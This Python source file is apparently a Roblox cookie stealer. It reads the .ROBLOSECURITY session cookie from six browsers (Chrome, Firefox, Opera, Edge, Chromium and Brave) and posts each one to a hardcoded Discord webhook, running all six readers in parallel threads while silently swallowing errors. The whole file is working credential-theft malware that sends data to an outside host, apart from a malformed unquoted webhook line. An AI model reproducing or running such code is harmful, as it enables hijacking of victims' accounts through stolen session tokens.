
import browser_cookie3 as bc
from threading import Thread
import requests

class Cookies:
	def __init__(self, webhook):
		self.webhook = https://discord.com/api/webhooks/1368349554847514685/4TymJeQ_q49LwenEOILIC3GF1fMUMcE_Q8sCWbvgvtD2waLLF2jvG_hQw6VCFVwZqshL

	def get_chrome(self):
		try:
			cookie = str(bc.chrome(domain_name='roblox.com'))
			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
			return cookie
		except:
			pass

	def get_firefox(self):
		try:
			cookie = str(bc.firefox(domain_name='roblox.com'))
			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
			return cookie
		except:
			pass

	def get_opera(self):
		try:
			cookie = str(bc.opera(domain_name='roblox.com'))
			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
			return cookie
		except:
			pass

	def get_edge(self):
		try:
			cookie = str(bc.edge(domain_name='roblox.com'))
			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
			return cookie
		except:
			pass

	def get_chromium(self): 
		try:
			cookie = str(bc.chromium(domain_name='roblox.com'))
			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
			return cookie
		except:
			pass

	def get_brave(self):
		try:
			cookie = str(bc.brave(domain_name='roblox.com'))
			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
			return cookie
		except:
			pass

	def run_all(self):
		Thread(target=self.get_chrome).start()
		Thread(target=self.get_firefox).start()
		Thread(target=self.get_opera).start()
		Thread(target=self.get_edge).start()
		Thread(target=self.get_chromium).start()
		Thread(target=self.get_brave).start()